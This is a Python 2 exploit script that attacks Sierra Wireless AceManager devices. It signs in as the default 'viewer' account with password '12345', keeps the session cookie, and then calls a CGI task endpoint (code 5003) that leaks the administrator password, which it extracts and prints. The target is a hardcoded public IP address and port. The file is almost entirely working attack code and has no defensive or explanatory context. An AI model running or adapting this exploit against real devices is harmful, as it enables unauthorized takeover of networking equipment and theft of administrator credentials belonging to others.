import logging
import httplib
import re
from termcolor import colored

class SierraWirelessPasswordRecovery:
    def __init__(self):
        self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
                   "Content-Type": "text/xml",
                   "Accept": "application/xml, text/xml, */*; q=0.01",
                   "Accept-Language": "en-US,en;q=0.5",
                   "X-Requested-With": "XMLHttpRequest",
                   "Connection": "close"}
        self.xml_connect = {"path": "/xml/Connect.xml",
                       "method": "POST"}
        self.xml_connect_payload = '<request xmlns="urn:acemanager"><connect><login>$username$</login>\
                               <password><![CDATA[$password$]]></password></connect></request>'
        self.cgi_get_task = {"path": "/cgi-bin/Embedded_Ace_Get_Task.cgi",
                        "method": "POST",
                        "payload": "5003"}
        self.host = '166.148.198.169'
        self.port = '9191'
        self.user = 'viewer'
        self.password = '12345'
        self.cookie = ''

    def get_cookie(self):
        self.xml_connect_payload = self.xml_connect_payload.replace("$username$", self.user)
        self.xml_connect_payload = self.xml_connect_payload.replace("$password$", self.password)
        print "[*] Establishing a session..."
        conn = httplib.HTTPConnection(self.host, self.port, timeout=25)
        conn.request(self.xml_connect['method'], self.xml_connect['path'], 
                     self.xml_connect_payload, self.headers)
        response = conn.getresponse()
        data = response.read()
        headers = response.getheaders()
        cookie = headers[1][1].split(';')
        print "[*] Cookie recovered: {0}".format(colored(cookie[0], 'green'))
        self.cookie = cookie[0]
        # print data

    def get_admin_password(self):
        headers_with_cookie = self.headers.update({'Cookie': self.cookie})
        # print headers_with_cookie
        # print self.headers
        print "[*] Running cgi-bin to recover admin password..."
        conn = httplib.HTTPConnection(self.host, self.port, timeout=25)
        conn.request(self.cgi_get_task['method'], self.cgi_get_task['path'],
                     self.cgi_get_task['payload'], self.headers)
        response = conn.getresponse()
        data = response.read()
        headers = response.getheaders()
        # print headers
        # print data
        recovered_password = re.findall(r"5003=(?P<password>.*)!", str(data))
        if recovered_password:
            print "[*] Admin password recovered: {0}".format(colored(recovered_password[0], 'red'))

def main():
    swpr = SierraWirelessPasswordRecovery()
    swpr.get_cookie()
    swpr.get_admin_password()


if __name__ == "__main__":
    main()
        
